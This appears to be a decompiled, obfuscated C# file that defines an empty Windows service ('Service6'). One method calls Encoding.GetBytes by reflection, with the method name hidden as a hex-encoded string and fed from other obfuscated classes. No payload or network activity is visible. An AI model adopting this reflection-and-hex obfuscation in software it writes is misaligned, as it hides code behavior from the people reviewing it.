using System;
using System.ComponentModel;
using System.Runtime.CompilerServices;
using System.ServiceProcess;
using System.Text;

namespace ns0;

internal sealed class Class51 : ServiceBase
{
	private IContainer icontainer_0;

	public Class51()
	{
		method_0();
	}

	protected override void OnStart(string[] args)
	{
	}

	protected override void OnStop()
	{
	}

	[SpecialName]
	internal static byte[] smethod_0()
	{
		return ((Class26.Delegate4)Delegate.CreateDelegate(typeof(Class26.Delegate4), Encoding.UTF8, typeof(Encoding).GetMethod(Class17.smethod_0("b44765744279746573"), new Type[1] { typeof(string) })))(Class41.smethod_0());
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((ServiceBase)this).Dispose(disposing);
	}

	private void method_0()
	{
		icontainer_0 = new Container();
		((ServiceBase)this).set_ServiceName("Service6");
	}
}
